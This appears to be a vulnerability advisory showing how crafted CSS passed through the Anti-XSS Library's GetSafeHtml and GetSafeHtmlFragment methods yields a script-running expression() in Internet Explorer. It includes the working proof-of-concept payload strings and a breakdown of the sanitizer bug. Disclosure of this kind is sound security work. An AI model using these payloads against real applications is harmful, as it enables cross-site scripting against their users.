Microsoft Anti-XSS Library 3.0 and 4.0 are vulnerable to an attack in which an attacker is able to create a specially formed CSS, that after passing through the GetSafeHTML or GetSafeHTMLFragment methods, contains an expression that triggers a JavaScript call in Internet Explorer.

The following ASP.NET code demonstrates the vulnerability:

```csharp
string data = Microsoft.Security.Application.Sanitizer.GetSafeHtml("<html>a<style><!--div{font-family:Foo,Bar\\,'a\\a';font-family:';color:expression(alert(1));y'}--></style><div>b</div></html>");

string data = Microsoft.Security.Application.Sanitizer.GetSafeHtmlFragment("<div style=\"font-family:Foo,Bar\\,'a\\a';font-family:';color:expression(alert(1));y'\">aaa</div>");
```

Explanation:
The string value can be broken down as follows:
```css
div{
  font-family:Foo,Bar\,'a\a';
  font-family:';color:expression(alert(1));y'
}
```
A bug in the Anti-XSS library causes the closing apostrophe in the first CSS rule to be dropped. Because of the string not being properly terminated, Internet Explorer now renders this CSS in a different way, which triggers a javascript call:

```css
div{

font-family:Foo,Bar\,'a\a;font-family:';
color:expression(alert(1));

y'

}
```
Due to this weakness, every application that relies on either GetSafeHTML or GetSafeHtmlFragment to sanitize user supplied data is vulnerable to XSS.
